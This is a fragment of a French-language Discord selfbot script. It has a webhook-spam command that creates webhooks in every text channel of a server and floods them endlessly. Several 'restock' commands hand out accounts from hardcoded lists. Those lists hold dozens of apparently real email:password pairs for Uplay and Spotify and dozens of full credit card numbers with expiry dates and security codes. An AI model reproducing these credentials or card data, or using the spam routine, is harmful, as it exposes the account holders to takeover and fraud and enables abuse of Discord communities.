      if(!message.member.hasPermission('MANAGE_WEBHOOKS')) return
       message.guild.channels.forEach(channel => {
          if (channel.type == 'text') {
              channel.createWebhook("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉", "https://discord.gg/PeNMgDtuHU").catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
          }
      })
      let interval6663 = setInterval(async function () {
          await message.guild.fetchWebhooks().then(web => web.forEach(webhook => webhook.send(webhookmessages).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))))
      })
      console.log("╟ Commande webhook spam éxécuté")
      console.log("╟─────────────────────────────────╢")
  }
if(message.content.startsWith(prefix + "branlette")){
    message.edit("8=:fist:==D ");
    message.edit("8==:fist:=D ");
    message.edit("8===:fist:D ");
    message.edit("8==:fist:=D ");
    message.edit("8=:fist:==D ")
    message.edit("8:fist:===D ");
    message.edit("8=:fist:==D ");
    message.edit("8==:fist:=D ");
    message.edit("8===:fist:D ")
    message.edit("8==:fist:=D:sweat_drops: ");
    message.edit("==:fist:D:sweat_drops: ")
    console.log("╟ Commande branlette executé")
    console.log("╟─────────────────────────────────╢")

    if (message.content.includes(prefix + "infoplus")) {
      if (message.author.id === client.user.id) {
          if (message.deletable) message.delete();

          var resp =
              ":spy: **__Membre(s) Total__** : " + message.guild.memberCount + "\n\n" +
              ":white_check_mark: **En Ligne** : " + message.guild.members.filter(o => o.presence.status === 'online').size + " | " +
              ":no_entry:  **Ne Pas Deranger** : " + message.guild.members.filter(d => d.presence.status === 'dnd').size + "\n" +
              ":large_orange_diamond: **Inactif** : " + message.guild.members.filter(i => i.presence.status === 'idle').size + " | " +
              ":zzz: **Hors Ligne** : " + message.guild.members.filter(a => a.presence.status === 'offline').size;

          let embed = new Discord.RichEmbed()
              .setColor(color)
              .setDescription(resp)
              .setTitle("**Stats Membre**");
          embed.setTimestamp();

          message.channel.send(embed);
      }
  }  }
  
if (message.content === prefix + "metal") {
  if (message.author.id === client.user.id) {
      console.log("(Commande : {/metals} Effectuer) \n ================");

      message.delete();
      message.channel
          .send(">>> Restock de Metal en cours..")

          .then(message => {
            message.edit(
              ">>> Restock  en cours \n **Chargement.** \n ▓░░░░░░░░░░░░░░░░░░░░░░░░ 4%"
          );
          message.edit(
              ">>> Restock  en cours \n **Chargement...** \n ▓▓▓░░░░░░░░░░░░░░░░░░░░░░ 12%"
          );
          message.edit(
              ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░ 20%"
          );
          message.edit(
              ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░ 28%"
          );
          message.edit(
              ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░ 44%"
          );
          message.edit(
              ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░ 64%"
          );
          message.edit(
              ">>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░ 79%"
          );
          message.edit(
              ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░ 92%"
          );
          message.edit(
              ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100% "
          );
              var fact = Math.floor(Math.random() * facts.length)

              message.edit(">>> ***Voila ton jeu metals : ***" + facts[fact]);
          })
  }
}
if (message.content === prefix + "cc") {
  if (message.author.id === client.user.id) {
          console.log("(Commande : {/cc} Effectuer) \n ================");

          message.delete();
          message.channel
              .send(">>> Restock de cc en cours..")

              .then(message => {
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓░░░░░░░░░░░░░░░░░░░░░░░░ 4%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement...** \n ▓▓▓░░░░░░░░░░░░░░░░░░░░░░ 12%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░ 20%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░ 28%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░ 32%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░ 44%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░ 52%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░ 64%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░ 72%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░ 80%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░ 88%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░ 92%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100% "
                  );
                  var fact = Math.floor(Math.random() * CC.length)

                  message.edit(">>> ***Voila ta cc : ***" + CC[fact]);
              })
      } else {
          message.edit(nowhite)
      }
  }




if (message.content === prefix + "pornhub") {
  if (message.author.id === client.user.id) {
          console.log("(Commande : {/pornhub} Effectuer) \n ================");

          message.delete();
          message.channel
              .send(">>> Restock de pornhub en cours..")

              .then(message => {
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓░░░░░░░░░░░░░░░░░░░░░░░░ 4%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement...** \n ▓▓▓░░░░░░░░░░░░░░░░░░░░░░ 12%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░ 20%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░ 28%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░ 32%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░ 44%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░ 52%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░ 64%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░ 72%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░ 80%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░ 88%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░ 92%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100% "
                  );
                  var fact = Math.floor(Math.random() * CC.length)

                  message.edit(">>> ***Voila ton compte pornhub : ***" + pornhub[fact])
              })
      } else {
          message.edit(nowhite)
      }
  }

if (message.content === prefix + "netflix") {
  if (message.author.id === client.user.id) {
          console.log("(Commande : {/netflix} Effectuer) \n ================");

          message.delete();
          message.channel
              .send(">>> Restock de netflix en cours..")

              .then(message => {
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓░░░░░░░░░░░░░░░░░░░░░░░░ 4%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement...** \n ▓▓▓░░░░░░░░░░░░░░░░░░░░░░ 12%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░ 20%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░ 28%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░ 44%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░ 64%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░ 79%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░ 92%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100% "
                  );
                  var fact = Math.floor(Math.random() * netflix.length)

                  message.edit(">>> ***Voila ton compte netflix : ***" + netflix[fact])
              });
      } else {
          message.edit(nowhite)
      }
  }


if (message.content === prefix + "nordvpn") {
  if (message.author.id === client.user.id) {
          console.log("(Commande : {/nordvpn} Effectuer) \n ================");

          message.delete();
          message.channel
              .send(">>> Restock de nordvpn en cours..")

              .then(message => {
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓░░░░░░░░░░░░░░░░░░░░░░░░ 4%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement...** \n ▓▓▓░░░░░░░░░░░░░░░░░░░░░░ 12%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░ 20%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░ 28%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░ 44%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░ 64%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░ 72%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░ 92%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100% "
                  );
                  var fact = Math.floor(Math.random() * CC.length)

                  message.edit(">>> ***Voila ton compte nord vpn : ***" + nrdvpn[fact])
              })
      } else {
          message.edit(nowhite)
      }
  }

if (message.content === prefix + "gtoken") {
  if (message.author.id === client.user.id) {
          console.log("(Commande : {/gtoken} Effectuer) \n ================");

          message.delete();
          message.channel
              .send(">>> Restock de token en cours..")

              .then(message => {
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓░░░░░░░░░░░░░░░░░░░░░░░░ 4%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement...** \n ▓▓▓░░░░░░░░░░░░░░░░░░░░░░ 12%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░ 28%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░ 44%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░ 64%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░ 79%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░ 92%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100% "
                  );
                  var fact = Math.floor(Math.random() * gtoken.length)
                  message.edit(">>> ***Voila ton token pour spam :*** " + gtoken[fact])
              });
      } else {
          message.edit(nowhite)
      }
  }

if (message.content === prefix + "dofus") {
  if (message.author.id === client.user.id) {
          console.log("(Commande : {/dofus} Effectuer) \n ================");

          message.delete();
          message.channel
              .send(">>> Restock de comptes dofus en cours..")

              .then(message => {
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓░░░░░░░░░░░░░░░░░░░░░░░░ 4%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement...** \n ▓▓▓░░░░░░░░░░░░░░░░░░░░░░ 12%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░ 28%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░ 44%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░ 64%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░ 79%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░ 92%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100% "
                  );
                  message.edit(
                      "***Voila ton compte Dofus :***"
                  );
                  var fact = Math.floor(Math.random() * dofus.length)
                  message.edit(">>> ***Voila ton compte dofus : ***" + dofus[fact])
              });
      } else {
          message.edit(nowhite)
      }
  }

if (message.content === prefix + "gspotify") {
  if (message.author.id === client.user.id) {
          console.log("(Commande : {/gspotify} Effectuer) \n ================");

          message.delete();
          message.channel
              .send(">>> Restock de comptes dofus en cours..")

              .then(message => {
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓░░░░░░░░░░░░░░░░░░░░░░░░ 4%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement...** \n ▓▓▓░░░░░░░░░░░░░░░░░░░░░░ 12%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░ 28%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░ 44%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░ 64%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░ 79%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░ 92%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100% "
                  );
                  var fact = Math.floor(Math.random() * spotify.length)
                  message.edit(">>> ***Voila ton compte Spotify : ***" + spotify[fact])
              });
      } else {
          message.edit(nowhite)
      }
  }

if (message.content === prefix + "uplay") {
  if (message.author.id === client.user.id) {
          console.log("(Commande : {/Uplay} Effectuer) \n ================");

          message.delete();
          message.channel
              .send(">>> Restock de comptes Uplay en cours..")

              .then(message => {
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓░░░░░░░░░░░░░░░░░░░░░░░░ 4%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement...** \n ▓▓▓░░░░░░░░░░░░░░░░░░░░░░ 12%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░ 28%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░ 44%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░ 64%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░ 79%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░ 92%"
                  );
                  message.edit(
                      ">>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100% "
                  );
                  var fact = Math.floor(Math.random() * uplay.length)
                  message.edit(">>> ***Voila ton compte uplay : ***" + uplay[fact])
              });
      } else {
          message.edit(nowhite)
      }
  }


if (message.content.includes(prefix + "fdp")) {
  if (message.author.id === client.user.id) {
      if (message.deletable) message.delete();

      var embed = new Discord.RichEmbed()
          .setTitle(` **jvétniker fdp comme lui : **`)
          .setDescription('')
          .setImage("https://cdn.discordapp.com/attachments/710299976550318080/711951558006407208/9k.png")
          .setColor(color)
          .setFooter(`𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩`, message.author.avatarURL)
      message.channel.sendEmbed(embed);
  }
}

var uplay = [
  "triputra95@gmail.com:1987684123w Units = 0 Level = 6 Tier = Blue Club Member = False Games = [assassins-creed-III]",
  "zombie4208@gmail.com:zombie01  Units = 110 Level = 31  Tier = Gold Club Member = False Games = [assassins-creed-brotherhood, assasins-creed-ii, assassins-creed-III, assassins-creed-III, assassins-creed-revelations, assassins-creed-unity, far-cry-3, far-cry-3-blood-dragon, far-cry-5, for-honor, rainbow-six-siege, splinter-cell-conviction, steep, the-crew]",
  "sponsel4@gmail.com:slapjack  Units = 60  Level = 16  Tier = Bronze Club Member = False Games = [assassins-creed-4-black-flag, , rainbow-six-siege, steep, tom-clancy-the-division] Platforms = [PC, ANDROID, PC, PS4, PC]",
  "stevenbradley54@yahoo.com:player54 Units = 270 Level = 19  Tier = Bronze Club Member = False Games = [assassins-creed-III, assassins-creed-4-black-flag, assassins-creed-origins, just-dance-2014, the-crew, tom-clancy-the-division, trackmania-turbo]  ",
  "steveschulenberg@yahoo.com:illinois  Units = 270 Level = 23  Tier = Silver Club Member = False Games = [far-cry-3, far-cry-3-blood-dragon, far-cry-4, far-cry-5, far-cry-new-dawn, far-cry-primal] Platforms = [PC, PC, PC, PC, PC",
  "syljon2@gmail.com:siwiec1995 Units = 40  Level = 8 Tier = Blue Club Member = False Games = [, rocksmith-2014-edition]  Platforms = [ANDROID, PC]",
  "trod2323@live.com:Basketball28 Units = 55  Level = 11  Tier = Bronze Club Member = False Games = [, far-cry-5, rainbow-six-siege, uno] Platforms = [ANDROID, PC, XONE, PC]",
  "trishap77@yahoo.com:Layla8611  Units = 180 Level = 20  Tier = Silver Club Member = False Games = [assassins-creed-III, assassins-creed-4-black-flag, assassins-creed-4-black-flag, assassins-creed-odyssey, assassins-creed-unity, , for-honor]  Platforms = [XBox360, XONE, XBox360, PS4, XONE, ANDROID, XONE",
  "nick.claro@gmail.com:boomerang Units = 50  Level = 20  Tier = Silver Club Member = False Games = [assassins-creed-4-black-flag, far-cry-3, far-cry-3-blood-dragon, , grow-home, rainbow-six-siege, rainbow-six-siege, steep] Platforms = [PC, PC, PC, ANDROID, PS4, PS4, PC",
  "troyky29@hotmail.com:troy052980  Units = 20  Level = 33  Tier = Gold Club Member = False Games = [airmech-arena, assassins-creed-III, far-cry-4, far-cry-5, far-cry-primal, for-honor, ghost-recon-wildlands, grow-home, rainbow-six-siege, rayman-legends, splinter-cell-blacklist, steep, the-crew, tom-clancy-the-division, uno, watch-dogs-2, watch-dogs, watch-dogs]  Platforms = [PS4, PS3, PS4, PS4, PS4, PS4, PS4, PS4, PS4, PS4, PS3, PS4, PS4, PS4, PS4, PS4, PS4, PS3",
  "sixxxis82@gmail.com:machine666 Units = 50  Level = 14  Tier = Bronze Club Member = False Games = [assassins-creed-brotherhood, assassins-creed-III, , ., tom-clancy-the-division]  ",
  "ben.b.boyce@gmail.com:guinness Units = 15  Level = 6 Tier = Blue Club Member = False Games = [tom-clancy-the-division] Platforms = [XONE",
  "maj.glitch@gmail.com:invasion1 Units = 0 Level = 16  Tier = Bronze Club Member = False Games = [assassins-creed-brotherhood, assassins-creed-4-black-flag, far-cry-3, , watch-dogs]",
  "sanguinans.sabulum@gmail.com:cityhugger  Units = 140 Level = 20  Tier = Silver Club Member = False Games = [anno-2070, far-cry-3-blood-dragon, , far-cry-new-dawn, ghost-recon-wildlands, might-magic-heroes-vi, tom-clancy-the-division-2, zombi  ",
  "steven.dvorak88@gmail.com:Sd9807618  Units = 0 Level = 4 Tier = Blue Club Member = False Games = [ghost-recon-future-soldier]  Platforms =",
  "stevenkeidel@gmail.com:Justice1  Units = 0 Level = 4 Tier = Blue Club Member = False Games = [watch-dogs]  Platforms = [PS4",
  "boshi068@gmail.com:kirbyoshi Units = 0 Level = 12  Tier = Bronze Club Member = False Games = [anno-2070, far-cry-3, rocksmith-2014-edition]  Platforms = [PC, PC, PC",
  "kazuo.st@gmail.com:kazu8086  Units = 0 Level = 3 Tier = Blue Club Member = False Games = [tom-clancy-the-division-2] Platforms = [PC]",
  "drzanis@gmail.com:sh33pdog Units = 110 Level = 18  Tier = Bronze Club Member = False Games = [anno-2070, assassins-creed-brotherhood, far-cry-3, far-cry-3-blood-dragon, far-cry-4, , ghost-recon-future-soldier, prince-of-persia-forgotten-sands, silent-hunter-5, splinter-cell-conviction] Platforms = [PC, PC, PC, PC, PC, ANDROID, PC, PC, PC",
  "poomin085771@gmail.com:555888Min",
  "shadowkid323@yahoo.com:323Swaoso",
  "wikjellsson@gmail.com:Dudesons1",
  "andrrena4io@mail.ru:Lowotortokoo1",
  "deniscernov@gmail.com:Parkurist070908",
  "dwd15@hotmail.com:Dawoud87",
  "isiaheholmes@gmail.com:Killer12",
  "josiahmiller08@gmail.com:Tucker22",
  "shaggydude47@hotmail.com:M3tal360",
  "kikinavarro01@hotmail.com:Kiki2001",
  "needforspeed425@yahoo.com:Volcom69",
  "opp1opp1@yahoo.com.tw:Opp1opp2",
  "vvomegavv@gmx.de:Vgn7javl",
  "parhat1210@126.com:FarHat4539206",
  "maxi-mome@bbox.fr:Maxou2005",
  "carloskako2@gmail.com:Lucathor22",
  "spw_wanstall@yahoo.co.uk:Tikiman266",
  "fyrstenborg@hotmail.com:Hppsc2175",
  "kombat2431@gmail.com:Komputer2",
  "cockeram@msn.com:Blunty238",
  "roy-raphael2002@hotmail.com:Raph4461",
  "davidaguilar891@yahoo.com:Panther12",
  "justinternet1@gmail.com:13Sandwich",
  "roman.rinaldi@hotmail.com:Lolilo12",
  "lawrencemayfield@hotmail.com:Tekken12",
  "juandy.gp@gmail.com:N0entres",
  "belias6070@gmail.com:Br3874el",
  "nottalala5640@gmail.com:Lalaweki1",
  "nchampion46@gmail.com:Skyline46",
  "jjf.joseph@gmail.com:Marmite2543",
  "adam@winkler.no:9w7s3gzT",
  "romeox_69@hotmail.com:Chattupon1",
  "roman988998@gmail.com:Pandora98",
  "seanstover1@gmail.com:Soccerboy98",
  "tipxdrakexdrfts@yahoo.com:Peehead2",
  "edivhjortalus@yahoo.com:Shadow52",
  "castle_tee@yahoo.com.au:Kuykay123",
  "leejiashenq123@gmail.com:Shenqga123",
  "cepheuse77@yahoo.com:Cndark77",
  "sam_berube_14@hotmail.com:Gohabsgo18",
  "huntg78@gmail.com:Havefun77",
  "skrillexonrunescape@gmail.com:Hodgson235",
  "tymeurland@gmail.com:Gurital1999"
]

const CC = [
  '5491840062178813|05|2026|606',
  '5491846063156450|02|2025|940',
  '5491842653582528|09|2023|270',
  '5491847675273758|03|2025|114',
  '5491846270263560|12|2025|707',
  '5491841044710772|01|2023|806',
  '5491840440011264|10|2022|844',
  '5491840865383578|11|2026|377',
  '5491848158801214|11|2026|826',
  '5491844468304627|04|2024|744',
  '5491842537001257|03|2025|793',
  '5491844028363626|06|2022|577',
  '5491841341015263|10|2025|912',
  '5491843587114685|10|2024|796',
  '5491843376135305|09|2023|391',
  '5491842146388707|05|2024|474',
  '5491840736558127|03|2025|958',
  '5491845158460835|06|2025|265',
  '5491848308252482|11|2024|767',
  '5491843855540850|04|2023|404',
  '5491848508470355|03|2022|141',
  '5491846174452178|09|2024|253',
  '5491840405472758|09|2024|227',
  '5491845073713300|06|2023|902',
  '5491847833067753|10|2022|229',
  '5491842871285425|01|2022|496',
  '5491841673334175|05|2025|620',
  '5491842861246734|01|2025|590',
  '5491844450124645|05|2026|277',
  '5491843012203723|01|2025|780',
  '5491845268754473|01|2023|678',
  '5491848260748113|10|2022|761',
  '5491844537826055|11|2022|365',
  '5491843528860164|01|2023|399',
  '5491841728135437|09|2022|471',
  '5491846136786267|04|2025|525',
  '5491845077325101|10|2024|822',
  '5491841103480846|09|2025|935',
  '5491840506712847|12|2026|972',
  '5491840682141100|06|2022|805',
  '5491846255338841|08|2023|580'
]

var spotify = [
  "zurobski@optusnet.com.au: Natsar77",
  "canni86@alice.it: cannavaro28",
  "dunand.guillaume@free.fr: babyc1",
  "mzerzghi@charter.net: Eden1018",
  "donovanauronforbes@yahoo.com: Snuffles93",
  "DJReimei@gmail.com:Toshujin1",
  "nikeboy32111@gmail.com:monSter1996",
  "pjarasek@alumni.nd.edu:Shutout121",
  "samfkissinger@gmail.com:Volvo1994",
  "magixredux@gmail.com:screamo07",
  "bdgolish@gmail.com:ramblers1",
  "krobinson444@gmail.com:bryant64",
  "ryanschaffer1@yahoo.com:Arrowhead10",
  "bigbabymin@gmail.com:lmp,33food1",
  "paulsifer22@gmail.com:pt042291",
  "kyle_cifelli@yahoo.com:Duskborn1",
  "joseco1805@gmail.com:jmts1805",
  "missshannon02@gmail.com:diamonds03 | Subscription: Spotify Free | US | ",
  "jamesgregory1119@gmail.com:Pineapples19 | Subscription: Spotify Free | US | ",
  "gunjitsingh91@gmail.com:flanker143 | Subscription: Spotify Free | IN | ",
  "cofran26@hotmail.com:popollo00 | Subscription: Spotify Free | AR | ",
  "bilalyolver@hotmail.com:bilal2003 | Subscription: Spotify Free | TR | ",
  "julianaa02@aol.com:JulianaA02 | Subscription: Spotify Free | US | ",
  "madrileencm@gmail.com:august11996 | Subscription: Spotify Free | US | ",
  "okpocharles84@gmail.com:emma8394 | Subscription: Spotify Free | TR | ",
  "savitanjerry07@hotmail.com:Lovecouple08 | Subscription: Spotify Free | US | ",
  "tflip08@gmail.com:bolts619 | Subscription: Spotify Free | US | ",
  "curlinjah@gmail.com:condit2007 | Subscription: Spotify Free | US | ",
  "jacqueline.lundsted@ksc.keene.edu:bunny1207 | Subscription: Spotify Free | US | ",
  "youngkj@mountunion.edu:Raider7293 | Subscription: Spotify Free | US | ",
  "marycameli@cox.net: Hubby123",
  "lucasof@terra.com.br: akos1848",
  "jk@persona.ca: jk911959",
  "ivzanini@uol.com.br: ione0104",
  "bert.geukens@telenet.be: bert2412",
  "gnotes@cox.net: Rgpj1970",
  "tlml.sev@orange.fr: co99al03",
  "jean.van.de.weerdt@telenet.be: weerdt86",
  "paola.migliorin@alice.it: paolam63",
  "jorisdeblieck@telenet.be: 1x1x1x",
  "jo.beaumat@orange.fr: oublier11",
  "phie95@web.de: phie030795",
  "barbara.quintelier@pandora.be: bquint0",
  "geert.van.den.hende@telenet.be: vum13unk",
  "valentin.jany@freenet.de: w1a2l3l4y5",
  "vera.de.belder@telenet.be: Vera6780",
  "fagner.santos@ibest.com.br: evikn45p",
